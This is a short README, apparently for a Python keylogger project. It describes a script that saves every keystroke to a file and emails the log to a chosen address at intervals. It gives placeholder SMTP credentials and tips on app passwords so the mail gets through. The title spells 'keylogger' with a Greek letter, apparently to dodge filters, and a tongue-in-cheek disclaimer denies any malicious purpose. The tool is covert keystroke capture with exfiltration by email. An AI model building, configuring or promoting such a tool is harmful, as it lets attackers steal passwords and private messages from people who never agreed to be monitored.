# An attempt to create a kεylogger using Python.

This project is for practicing email automation, and stuff. Not for creating <br>
mal. software. Definitely not. This script saves keys typed into <br>
keyboard on a file in script directory, and sends them to an email every
x seconds.

Sender Email:
```commandline
    smtp_username = 'urmail@gmail.com'
    smtp_password = 'urpass123123213' # or app password
```
Receiver Email:
```commandline
    send_email('reveiver@gmail.com')
```
Note: 
- smtp might not accept your email for some reason. To fix, <br>
enable 2FA in your (sender) email and generate an app password, <br>
enter it in password.
- Change elapsed time in line 28 to however seconds the email should be sent. <br> Those are seconds of *typing time* an not actual seconds. 